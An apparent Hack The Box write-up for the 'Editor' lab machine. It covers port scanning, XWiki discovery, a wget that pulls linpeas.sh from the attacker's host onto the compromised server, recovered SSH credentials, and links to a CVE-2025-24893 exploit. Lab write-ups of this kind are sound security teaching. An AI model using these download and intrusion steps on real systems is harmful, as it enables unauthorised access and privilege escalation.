# HTB Editor Machine

## Enumeration:

```jsx
┌─[✗]─[hakcwell@parrot]─[~/Desktop/HTB/editor]
└──╼ $rustscan -a 10.10.11.80 -- -sC -sV -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/hakcwell/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.80:22
Open 10.10.11.80:80
Open 10.10.11.80:4444
Open 10.10.11.80:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV -A" on ip 10.10.11.80
Depending on the complexity of the script, results may take some time to appear.

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http        syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
4444/tcp open  nagios-nsca syn-ack Nagios NSCA
8080/tcp open  http        syn-ack Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:34
Completed NSE at 13:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.77 seconds

```

![image.png](image.png)

Robots.txt on the wiki subdomain found through nmap running xwiki using jetty on port 8080

```jsx
User-agent: *
# Prevent bots from executing all actions except "view" and
# "download" since:
# 1) we don't want bots to execute stuff in the wiki by
#    following links! (for example delete pages, add comments,
#    etc)
# 2) we don't want bots to consume CPU and memory
#   (for example to perform exports)
Disallow: /xwiki/bin/viewattachrev/
Disallow: /xwiki/bin/viewrev/
Disallow: /xwiki/bin/pdf/
Disallow: /xwiki/bin/edit/
Disallow: /xwiki/bin/create/
Disallow: /xwiki/bin/inline/
Disallow: /xwiki/bin/preview/
Disallow: /xwiki/bin/save/
Disallow: /xwiki/bin/saveandcontinue/
Disallow: /xwiki/bin/rollback/
Disallow: /xwiki/bin/deleteversions/
Disallow: /xwiki/bin/cancel/
Disallow: /xwiki/bin/delete/
Disallow: /xwiki/bin/deletespace/
Disallow: /xwiki/bin/undelete/
Disallow: /xwiki/bin/reset/
Disallow: /xwiki/bin/register/
Disallow: /xwiki/bin/propupdate/
Disallow: /xwiki/bin/propadd/
Disallow: /xwiki/bin/propdisable/
Disallow: /xwiki/bin/propenable/
Disallow: /xwiki/bin/propdelete/
Disallow: /xwiki/bin/objectadd/
Disallow: /xwiki/bin/commentadd/
Disallow: /xwiki/bin/commentsave/
Disallow: /xwiki/bin/objectsync/
Disallow: /xwiki/bin/objectremove/
Disallow: /xwiki/bin/attach/
Disallow: /xwiki/bin/upload/
Disallow: /xwiki/bin/temp/
Disallow: /xwiki/bin/downloadrev/
Disallow: /xwiki/bin/dot/
Disallow: /xwiki/bin/delattachment/
Disallow: /xwiki/bin/skin/
Disallow: /xwiki/bin/jsx/
Disallow: /xwiki/bin/ssx/
Disallow: /xwiki/bin/login/
Disallow: /xwiki/bin/loginsubmit/
Disallow: /xwiki/bin/loginerror/
Disallow: /xwiki/bin/logout/
Disallow: /xwiki/bin/lock/
Disallow: /xwiki/bin/redirect/
Disallow: /xwiki/bin/admin/
Disallow: /xwiki/bin/export/
Disallow: /xwiki/bin/import/
Disallow: /xwiki/bin/get/
Disallow: /xwiki/bin/distribution/
Disallow: /xwiki/bin/jcaptcha/
Disallow: /xwiki/bin/unknown/
Disallow: /xwiki/bin/webjars/

```

![image.png](image%201.png)

![image.png](image%202.png)

```jsx
xwiki@editor:/var/tmp$ wget http://10.10.14.92:8000/linpeas.sh
wget http://10.10.14.92:8000/linpeas.sh
--2025-09-24 19:08:48--  http://10.10.14.92:8000/linpeas.sh
Connecting to 10.10.14.92:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3391424 (3.2M) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>]   3.23M   198KB/s    in 14s     

2025-09-24 19:09:03 (233 KB/s) - ‘linpeas.sh’ saved [3391424/3391424]

xwiki@editor:/var/tmp$ ls
ls
linpeas.sh  xwiki-8080.lck

```

![image.png](image%203.png)

### Creds:

```jsx
User: oliver
Pass: 'theEd1t0rTeam99'
```

## Foothold:

```jsx
┌─[✗]─[hakcwell@parrot]─[~/Desktop/HTB/editor/CVE-2025-24893]
└──╼ $ssh oliver@editor.htb
The authenticity of host 'editor.htb (10.10.11.80)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'editor.htb' (ED25519) to the list of known hosts.
oliver@editor.htb's password: "theEd1t0rTeam99"
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

```

### User’s Flag:

![image.png](image%204.png)

### Root Flag:

![image.png](image%205.png)

![image.png](image%206.png)

![image.png](image%207.png)

[https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)

[https://www.offsec.com/blog/cve-2025-24893/](https://www.offsec.com/blog/cve-2025-24893/)